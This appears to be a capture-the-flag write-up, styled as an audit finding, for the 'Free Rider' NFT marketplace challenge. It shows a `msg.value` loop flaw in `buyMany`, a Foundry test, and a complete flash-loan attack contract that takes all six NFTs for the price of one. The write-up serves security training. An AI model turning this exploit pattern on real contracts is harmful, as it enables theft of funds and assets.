## High Severity Issues

### [H-1] `msg.value` Persistence Exploit in `buyMany` Function

**Description:** The `FreeRiderNFTMarketplace` protocol lists 6 NFTs for sale at 15 ETH each. A vulnerability in the `buyMany` function allows an attacker to purchase all 6 NFTs for only 15 ETH. The issue arises because the `msg.value` check in the `_buyOne` function does not account for the cumulative cost of multiple NFTs within the loop, allowing an attacker to bypass payment requirements for subsequent NFTs after the initial 15 ETH. The protocol owner has announced a bounty of 45 ETH for anyone who purchases the NFTs and transfers them to the recovery manager.

```javascript
function buyMany( uint256[] calldata tokenIds ) external payable nonReentrant {
        for (uint256 i = 0; i < tokenIds.length; ++i) {
            unchecked {
                _buyOne(tokenIds[i]);
            }
        }
    }

function _buyOne(uint256 tokenId) private {
        uint256 priceToPay = offers[tokenId];

        if (priceToPay == 0) {
            revert TokenNotOffered(tokenId);
        }

        if (msg.value < priceToPay) {
            revert InsufficientPayment();
        }

        --offersCount;

        DamnValuableNFT _token = token; 

        _token.safeTransferFrom(_token.ownerOf(tokenId), msg.sender, tokenId);

        payable(_token.ownerOf(tokenId)).sendValue(priceToPay);

        emit NFTBought(msg.sender, tokenId, priceToPay);
    }
```

**Impact:** An attacker can exploit this vulnerability to acquire all 6 NFTs for only 15 ETH, resulting in a significant financial loss for the protocol (a shortfall of 75 ETH). This undermines the protocol's economic model and trust in its security.

**Proof of Concept:**

```javascript
function testOfferMany() public {
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < mintAmount; i++) {
            tokenIds[i] = i;
        }

        uint256[] memory prices = new uint256[](6);
        for (uint256 i = 0; i < mintAmount; i++) {
            prices[i] = 15;
        }

        vm.startPrank(marketPlaceOwner);
        nft.setApprovalForAll(address(marketPlace), true);
        marketPlace.offerMany(tokenIds, prices);
        vm.stopPrank();

        vm.startPrank(address(resolver), address(resolver)); // sets both msg.sender and tx.origin
        pool.flashLoan(IERC3156FlashBorrower(resolver), 15 ether, "");
}
```

**Recommended Mitigation:**

1. Track the `msg.value` properly to ensure that the total payment matches the sum of all NFT prices in the `buyMany` function, preventing exploitation of the loop.

Recovery Contract:

```javascript
contract Resolver is IERC721Receiver, IERC3156FlashBorrower {
    FreeRiderNFTMarketplace public marketpalace;
    FreeRiderRecoveryManager public recoveryManager;
    DamnValuableNFT public nft;

    constructor(FreeRiderNFTMarketplace _marketPlace) {
        marketpalace = _marketPlace;
        nft = marketpalace.token();
    }

    function setRecoveryManager(
        FreeRiderRecoveryManager _recoveryManager
    ) external {
        require(address(recoveryManager) == address(0), "already-set");
        recoveryManager = _recoveryManager;
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external override returns (bytes32) {
        uint256[] memory tokenIds = new uint256[](6);

        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }

        marketpalace.buyMany{value: amount}(tokenIds);
        for (uint256 i = 0; i < 6; i++) {
            bytes memory data = i == 5
                ? abi.encode(address(this))
                : new bytes(0);
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                data
            );
        }

        // Repay flash loan

        SafeTransferLib.safeTransferETH(msg.sender, amount); // optimized one , Recommended

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```
